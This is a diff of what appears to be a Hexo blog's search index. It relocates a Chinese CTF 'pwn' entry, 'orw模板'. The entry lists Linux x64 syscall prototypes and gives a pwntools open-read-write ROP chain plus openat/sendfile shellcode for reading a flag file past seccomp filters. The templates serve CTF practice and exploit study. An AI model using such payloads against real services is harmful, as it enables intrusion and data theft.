@@ -412,106 +412,6 @@ _IO_str_jumps
       </tags>
   </entry>
   <entry>
-    <title>orw模板</title>
-    <url>/2024/08/10/orw%E6%A8%A1%E6%9D%BF/</url>
-    <content><![CDATA[<h1 id="orw-模板"><a href="#orw-模板" class="headerlink" title="orw 模板"></a>orw 模板</h1><h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a><em>tips</em></h3><p>liunx64：<br>1、read 0、readv 19<br>2、write 1、writev 20<br>3、open 2、openat 257<br>4、sendfile 40    </p>
-<br>
- 
-<h2 id="orw的原型及参数"><a href="#orw的原型及参数" class="headerlink" title="orw的原型及参数"></a>orw的原型及参数</h2><pre><code>1. read
-原型: ssize_t read(int fd, void *buf, size_t count);
-参数:
-fd：文件描述符。
-buf：指向存储读取数据的缓冲区的指针。
-count：要读取的字节数。      
-
-2. readv
-原型: ssize_t readv(int fd, const struct iovec *iov, int iovcnt);
-参数:
-fd：文件描述符。
-iov：指向 iovec 结构体数组的指针，每个 iovec 结构体包含一个缓冲区及其大小。
-iovcnt：iovec 结构体的数量。  
-
-3. write
-原型: ssize_t write(int fd, const void *buf, size_t count);
-参数:
-fd：文件描述符。
-buf：指向要写入的数据的缓冲区的指针。
-count：要写入的字节数。
-
-4. writev
-原型: ssize_t writev(int fd, const struct iovec *iov, int iovcnt);
-参数:
-fd：文件描述符。
-iov：指向 iovec 结构体数组的指针，每个 iovec 结构体包含一个缓冲区及其大小。
-iovcnt：iovec 结构体的数量。
-
-5. open
-原型: int open(const char *pathname, int flags, mode_t mode);
-参数:
-pathname：要打开的文件的路径。
-flags：打开文件的标志，如 O_RDONLY、O_WRONLY、O_RDWR。
-mode：文件权限，仅在使用 O_CREAT 标志时需要。
-
-6. openat
-原型: int openat(int dirfd, const char *pathname, int flags, mode_t mode);
-参数:
-dirfd：目录文件描述符，表示相对路径的基准目录（可以是 AT_FDCWD）。
-pathname：要打开的文件的路径。
-flags：打开文件的标志，如 O_RDONLY、O_WRONLY、O_RDWR。
-mode：文件权限，仅在使用 O_CREAT 标志时需要。
-
-7. sendfile
-原型: ssize_t sendfile(int out_fd, int in_fd, off_t *offset, size_t count);
-参数:
-out_fd：目标文件描述符（通常是套接字）。
-in_fd：源文件描述符。
-offset：偏移量的指针，用于指定从源文件中开始的字节位置（如果为 NULL，从当前文件位置开始）。
-count：要发送的字节数。
-</code></pre>
-<h3 id="模版"><a href="#模版" class="headerlink" title="模版"></a><em>模版</em></h3><p>只禁用了execve   </p>
-<pre><code>o=base+libc.sym[&#39;open&#39;]
-r=base+libc.sym[&#39;read&#39;]
-w=base+libc.sym[&#39;write&#39;]
-orw=p64(rdi)+p64(flag)+p64(rsi)+p64(0)+p64(o)
-orw+=p64(rdi)+p64(3)+p64(rsi)+p64(flag)+p64(rdx_r)+p64(0x30)+p64(0)+p64(r)
-orw+=p64(rdi)+p64(1)+p64(rsi)+p64(flag)+p64(rdx_r)+p64(0x30)+p64(0)+p64(w)
-</code></pre>
-<p>其中的寄存器的呈现形式及赋值视情况而变动。</p>
- <br>
- 禁用open、execve、read、write、readv、writev
-
-<pre><code>asm(&#39;&#39;&#39;
-mov rdi,3;                    #openat调用
-mov rdx,0;
-mov r10,0;
-mov rsi,flag;                 #flag地址
-mov rax,257;
-syscall;
-
-mov rdi,0;                    #sendfile调用  
-mov rsi,3;
-mov rdi,1;
-xor rdx,rdx;
-mov r10,0x33;                 #读取大小
-mov rax,40;
-syscall;
-
-
-mov rax,60;                    #exit调用
-xor rdi,rdi;
-syscall;
-&#39;&#39;&#39;
-)
-</code></pre>
-<p>其中指令的表现形式也视具体情况而变动。</p>
-]]></content>
-      <tags>
-        <tag>pwn</tag>
-        <tag>ctf</tag>
-        <tag>orw</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>house of模板</title>
     <url>/2024/07/25/house%20of/</url>
     <content><![CDATA[<h1 id="house-of-利用模板及利用条件"><a href="#house-of-利用模板及利用条件" class="headerlink" title="house of 利用模板及利用条件"></a>house of 利用模板及利用条件</h1><span id="more"></span>
@@ -690,6 +590,106 @@ _wide_data-&gt;_wide_vtable-&gt;overflow设置为地址C用于劫持RIP，即满
         <tag>pwn</tag>
         <tag>IO</tag>
         <tag>house of</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>orw模板</title>
+    <url>/2024/08/10/orw%E6%A8%A1%E6%9D%BF/</url>
+    <content><![CDATA[<h1 id="orw-模板"><a href="#orw-模板" class="headerlink" title="orw 模板"></a>orw 模板</h1><h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a><em>tips</em></h3><p>liunx64：<br>1、read 0、readv 19<br>2、write 1、writev 20<br>3、open 2、openat 257<br>4、sendfile 40    </p>
+<br>
+ 
+<h2 id="orw的原型及参数"><a href="#orw的原型及参数" class="headerlink" title="orw的原型及参数"></a>orw的原型及参数</h2><pre><code>1. read
+原型: ssize_t read(int fd, void *buf, size_t count);
+参数:
+fd：文件描述符。
+buf：指向存储读取数据的缓冲区的指针。
+count：要读取的字节数。      
+
+2. readv
+原型: ssize_t readv(int fd, const struct iovec *iov, int iovcnt);
+参数:
+fd：文件描述符。
+iov：指向 iovec 结构体数组的指针，每个 iovec 结构体包含一个缓冲区及其大小。
+iovcnt：iovec 结构体的数量。  
+
+3. write
+原型: ssize_t write(int fd, const void *buf, size_t count);
+参数:
+fd：文件描述符。
+buf：指向要写入的数据的缓冲区的指针。
+count：要写入的字节数。
+
+4. writev
+原型: ssize_t writev(int fd, const struct iovec *iov, int iovcnt);
+参数:
+fd：文件描述符。
+iov：指向 iovec 结构体数组的指针，每个 iovec 结构体包含一个缓冲区及其大小。
+iovcnt：iovec 结构体的数量。
+
+5. open
+原型: int open(const char *pathname, int flags, mode_t mode);
+参数:
+pathname：要打开的文件的路径。
+flags：打开文件的标志，如 O_RDONLY、O_WRONLY、O_RDWR。
+mode：文件权限，仅在使用 O_CREAT 标志时需要。
+
+6. openat
+原型: int openat(int dirfd, const char *pathname, int flags, mode_t mode);
+参数:
+dirfd：目录文件描述符，表示相对路径的基准目录（可以是 AT_FDCWD）。
+pathname：要打开的文件的路径。
+flags：打开文件的标志，如 O_RDONLY、O_WRONLY、O_RDWR。
+mode：文件权限，仅在使用 O_CREAT 标志时需要。
+
+7. sendfile
+原型: ssize_t sendfile(int out_fd, int in_fd, off_t *offset, size_t count);
+参数:
+out_fd：目标文件描述符（通常是套接字）。
+in_fd：源文件描述符。
+offset：偏移量的指针，用于指定从源文件中开始的字节位置（如果为 NULL，从当前文件位置开始）。
+count：要发送的字节数。
+</code></pre>
+<h3 id="模版"><a href="#模版" class="headerlink" title="模版"></a><em>模版</em></h3><p>只禁用了execve   </p>
+<pre><code>o=base+libc.sym[&#39;open&#39;]
+r=base+libc.sym[&#39;read&#39;]
+w=base+libc.sym[&#39;write&#39;]
+orw=p64(rdi)+p64(flag)+p64(rsi)+p64(0)+p64(o)
+orw+=p64(rdi)+p64(3)+p64(rsi)+p64(flag)+p64(rdx_r)+p64(0x30)+p64(0)+p64(r)
+orw+=p64(rdi)+p64(1)+p64(rsi)+p64(flag)+p64(rdx_r)+p64(0x30)+p64(0)+p64(w)
+</code></pre>
+<p>其中的寄存器的呈现形式及赋值视情况而变动。</p>
+ <br>
+ 禁用open、execve、read、write、readv、writev
+
+<pre><code>asm(&#39;&#39;&#39;
+mov rdi,3;                    #openat调用
+mov rdx,0;
+mov r10,0;
+mov rsi,flag;                 #flag地址
+mov rax,257;
+syscall;
+
+mov rdi,0;                    #sendfile调用  
+mov rsi,3;
+mov rdi,1;
+xor rdx,rdx;
+mov r10,0x33;                 #读取大小
+mov rax,40;
+syscall;
+
+
+mov rax,60;                    #exit调用
+xor rdi,rdi;
+syscall;
+&#39;&#39;&#39;
+)
+</code></pre>
+<p>其中指令的表现形式也视具体情况而变动。</p>
+]]></content>
+      <tags>
+        <tag>pwn</tag>
+        <tag>ctf</tag>
+        <tag>orw</tag>
       </tags>
   </entry>
   <entry>
